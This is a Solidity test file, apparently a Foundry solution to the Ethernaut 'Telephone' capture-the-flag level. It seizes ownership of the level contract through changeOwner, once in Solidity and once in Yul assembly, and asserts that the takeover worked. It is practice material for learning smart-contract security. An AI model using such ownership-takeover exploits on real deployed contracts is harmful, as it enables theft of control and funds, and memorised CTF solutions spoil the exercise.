// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {ITelephone} from "ethernaut/4ITelephone.sol";
import {BaseTest} from "./BaseTest.t.sol";

contract TelephoneTest is BaseTest {
    ITelephone public telephoneInstance = ITelephone(0x293dec2f8Fddb8F729f5E78F136A296cef81f9B4);

    function setUp() public override {
        super.setUp();
    }

    function exploitSol() internal override {
        telephoneInstance.changeOwner(address(69));
    }

    function testExploitSol() public override {
        exploitSol();
        assertEq(telephoneInstance.owner(), address(69));
    }

    function exploitYul() internal override {
        assembly {
            mstore(0, 0xa6f9dae1)
            mstore(32, 69)
            pop(call(gas(), sload(telephoneInstance.slot), 0, 28, 36, 0, 0))
        }
    }

    function testExploitYul() public override {
        exploitYul();
        assertEq(telephoneInstance.owner(), address(69));
    }
}
